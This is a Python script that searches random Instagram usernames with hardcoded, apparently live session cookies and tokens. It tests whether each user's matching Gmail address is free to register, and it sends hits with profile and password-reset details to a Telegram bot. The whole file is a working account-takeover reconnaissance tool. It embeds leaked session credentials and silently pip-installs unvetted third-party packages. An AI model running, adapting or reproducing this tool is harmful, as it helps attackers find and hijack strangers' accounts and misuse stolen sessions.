try:
	from DARKI7X import HITS
	import webbrowser
	from LegendsLIB import *
	from VENOMgetREST import *
	import random,requests, os, DARKI7X, threading, datetime, pyfiglet
	from user_agent import generate_user_agent
	from datetime import date
except:
	import os 
	os.system('pip install --upgrade LegendsLIB')
	os.system('pip install --upgrade datetime')
	os.system('clear')
	os.system('pip install --upgrade DARKI7X')
	os.system('pip install --upgrade user_agent')
	os.system('pip install --upgrade gdolib')
	os.system('pip install --upgrade secrets')
	os.system('pip install --upgrade instaloader')
	os.system('pip install --upgrade telebot')
	os.system("pip install pyfiglet")
	os.system('pip install --upgrade VENOMgetREST')
	
F = '\033[1;32m' #اخضر
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
PN='\033[1;35m' #BINK
#__'____________'
P = pyfiglet.figlet_format('ID')
P2 = pyfiglet.figlet_format(' TOKEN')


ID=input(G+P+Bl+"\nENTER ID:  ")
if ID=='':
	exit('\033[1;31mID FALSE')
os.system('clear')

Token=input(P2+"\033[1;36m\nENTER TOKEN:  ")
def send(X):
				global Token, ID
				tlg=requests.post(f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={X} ").json()
				idmesg=tlg['result']['message_id']
				requests.get(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=لا تـنسى ان تـرسل صـور الـصيد - @T_7_44 🏆&reply_to_message_id={idmesg}')
bb ="qtertyuioplkjhgfdsazxc0987123564vbnm"
kokase='249237472%3AOgNczUIlUfx1VB%3A4','7284126125%3AeaSoUAtEOYBtSv%3A5%3AAYe6K_wAJxteaeXFTovGp_loo6pFDJ0ND22DyR_EyA', 
'53641662058%3AbXFIGWyYnDdy8A%3A8%3AAYe4gThddMZz_aKU4VOcZU5F_vvx6hzuyDjd-km0QQ', 
'55947952969%3AsiFuYRIX4XMG4K%3A10%3AAYfnr1HPWRy_nmxQPP7Eo_xQV2vaR9tT6gVcoTxs4w', 
'55255504546:WedCc4482liKfc:1:AYf3E-UjLoG6WSd_9wqb-kW5TDl5RW8OEmlcYZNIPw', 
'34680078796%3AIRpkzle99NbzBQ%3A2%3AAYfNoR2cXb6m53LfIMAvitMPqTQD1M_HMTKNqqubSQ','34680078796%3AIRpkzle99NbzBQ%3A2%3AAYfNoR2cXb6m53LfIMAvitMPqTQD1M_HMTKNqqubSQ','284646253%3AkUzrhDjq9fn4RU%3A13%3AAYeEWvLGFhr_BwHodf6ka8Tbai_YlMo7SxOZ-r_kig','55947952969%3AsiFuYRIX4XMG4K%3A10%3AAYfnr1HPWRy_nmxQPP7Eo_xQV2vaR9tT6gVcoTxs4w','55947952969%3AUSAR6FDie7ELnT%3A13%3AAYfLgfg4DilBZ4MKPpgpdfto3R03GjiLdk5hF2EZcQ'
def malomat(maile):
				global info
				user = maile.split('@')[0]
				rest=VENOM.get_rest(user)
				info = A7X.info(user)
				name=info["Name"]
				user=info["User"]
				folwing=info["Followers"]
				folowers=info["Followors"]
				ID=info["ID"]
				privet=info["Privacy"]
				date=info["Date"]
				bio=info["Bio"]
				X=f'''
				[💔] 𝐍𝐀𝐌𝐄 ➥    {name}
[👻] 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 ➥   {user}
[📧] 𝐄𝐌𝐀𝐈𝐋 ➥  {maile}
[👥] 𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 ➥   {folowers}
[🗣] 𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆 ➥  {folwing} 
[🆔] 𝐈𝐃 ➥ {ID}
[💞] 𝐁𝐈𝐎 ➥ {bio}
[⏱] 𝐃𝐀𝐓𝐄 ➥ {date}
[🌚] 𝐑𝐄𝐒𝐓 ➥ {rest}
[❤️‍🔥] 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 ➥ {privet}
[💘] 𝐋𝐈𝐍𝐊 »https://www.instagram.com/{user}
PY: @T_7_44 - https://t.me/Iraqimothr
 '''
				send(X)
def randome():
        bade=0
        done=0
        bb ="qwertyuioplkjhgfdsazxcvbnm0987654321"
        while True:
	        seoi=random.choice(kokase)
	        usek='qtertyuioplkjhgfdsazxcvbnm0987654321.'
	        numo='5678'
	        rng=int("".join(random.choice(numo)for i in range(1)))
	        username=str("".join(random.choice(usek)for i in range(rng)))
	        url=f'https://www.instagram.com/web/search/topsearch/?context=blended&query={username}&rank_token=0.38549261586414585&include_reel=true'
	        
	        head = {
	        'accept': '*/*',
	        'accept-encoding': 'gzip, deflate, br',
	        'accept-language': 'en-US,en;q=0.9',
	       # 'content-length': '336',
	#        'content-type': 'application/x-www-form-urlencoded',
	        'Cookie':'mid=Yuoj_QABAAGDy60NqxnFkEK1ugGo; ig_did=73D09A01-5DEF-4825-A5FC-297629366704; ig_nrcb=1; dpr=1.75; datr=HyTqYpFIZCgFZLABtNmwFg7j; ds_user_id=54376972287; shbid="3201\05454376972287\0541691331769:01f7ecaf474c01cf2b64f89f656976d0965c8da3073154330a4900add3c619f67e943202"; shbts="1659795769\05454376972287\0541691331769:01f70263e8842a11c12dee03be01e020f555ebaa18ecb741a217c2cc23830cc4991498f9"; csrftoken=yGVOWF0iptpC69PXXdisZrltMc5Fzv5W; sessionid={seoi}',
	       # 'origin': 'https://www.instagram.com',
	        'referer': 'https://www.instagram.com/explore/search/',
	        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
	        'sec-ch-ua-mobile': '?0',
	        'sec-fetch-dest': 'empty',
	        'sec-fetch-mode': 'cors',
	        'sec-fetch-site': 'same-origin',
	        'user-agent': generate_user_agent(),
	        'x-asbd-id': '437806',
	        'x-csrftoken': 'B5EvgsGegpjkHbwakmeZzZeibMUyPXOo',
	        'x-ig-app-id': '936619743392459',
	        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
	        #x-requested-with': 'caee87137ae9',
	        'x-requested-with': 'XMLHttpRequest'
	    }

	        y= requests.get(url,headers=head).json()
	        try:
	        	iddd = len(str(y['users'][0]['user']['pk']))
	        except IndexError as error:
	        	continue
	        for ll in range(0,iddd):
	        	try:
	        		nn = str(y['users'][ll]['user']['username'])
	        		email=nn+'@gmail.com'
	        		checking=HITS(email)
	        		if checking==True:

	        			maile=email
	        			done+=1
	        			os.system('clear')
	        			print(f'''{Y}
                                  
                                  
  {B}    « صيد متاحات انستا »
    {Bl}━━━━━━━━━━━━━━━━━━━━•


{Y}•------------------------------•
{F}● 𝗛𝗶𝘁 › {done}  
{R}● 𝗕𝗮𝗱 › {bade}  {Y} 
•------------------------------•
{W} ⌯ {B}@T_7_44    ''') 
	        			malomat(maile)
	        		else:
	        			bade+=1
	        			os.system('clear')
	        			print(f'''{Y}  
                                  
                                  
  {B}    « صيد متاحات انسته »
    {Bl}━━━━━━━━━━━━━━━━━━━━•


{Y}•------------------------------•
{F}● 𝗛𝗶𝘁 › {done}  
{R}● 𝗕𝗮𝗱 › {bade}  {Y} 
•------------------------------•
{W} ⌯ {B}@T_7_44    ''') 
	        	except IndexError as error:
	        		continue
Threads=[] 
for t in range(1):
	x = threading.Thread(target=randome)
	x.start()
	Threads.append(x)
for Th in Threads:
	Th.join()
randome()